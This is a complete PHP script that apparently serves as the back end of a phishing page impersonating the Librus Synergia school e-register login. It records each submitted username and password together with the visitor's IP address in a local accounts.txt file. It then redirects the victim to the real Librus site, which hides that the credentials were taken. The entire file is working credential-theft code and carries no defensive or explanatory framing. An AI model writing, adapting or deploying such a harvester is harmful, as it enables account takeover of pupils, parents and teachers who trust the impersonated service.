<?php
 if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    header("Location: http://synergia.librus.pl/");
    exit;
  }
$ip = $_SERVER['REMOTE_ADDR'];
$username = $_POST['Login'];
$password = $_POST['Pass'];

$file = fopen("accounts.txt", "a") or die("some error occured");
$txt = "$username:$password:$ip\n";
fwrite($file, $txt);
fclose($file);

header("Location: http://synergia.librus.pl/");